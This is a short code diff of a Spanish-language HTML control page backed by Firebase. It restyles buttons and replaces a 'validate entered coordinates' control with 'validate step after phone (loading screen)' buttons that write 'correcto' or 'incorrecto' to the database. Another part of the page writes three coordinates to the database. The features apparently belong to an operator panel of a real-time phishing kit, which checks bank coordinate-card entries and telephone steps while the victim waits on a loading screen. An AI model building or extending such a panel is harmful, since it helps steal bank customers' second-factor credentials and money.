@@ -42,7 +42,7 @@
       border: none;
       border-radius: 5px;
       cursor: pointer;
-      margin-right: 1rem;
+      margin: 0.25rem 0.5rem 0.25rem 0;
     }
     button:hover {
       background: #a7282f;
@@ -74,9 +74,9 @@
   </div>
 
   <div class="section">
-    <label>Validar coordenadas ingresadas</label>
-    <button onclick="marcarResultado(true)">✅ Coordenadas correctas</button>
-    <button onclick="marcarResultado(false)">❌ Coordenadas incorrectas</button>
+    <label>Validar paso luego de teléfono (pantalla cargando)</label>
+    <button onclick="marcarValidacion('correcto')">✅ Siguiente</button>
+    <button onclick="marcarValidacion('incorrecto')">❌ Error</button>
   </div>
 
   <div class="section">
@@ -110,8 +110,8 @@
       db.ref("coordenadas").set([coord1, coord2, coord3]);
     }
 
-    function marcarResultado(esCorrecto) {
-      db.ref("validacion").set(esCorrecto ? "correcto" : "incorrecto");
+    function marcarValidacion(valor) {
+      db.ref("validacion").set(valor);
     }
 
     const registrosDiv = document.getElementById("registros");
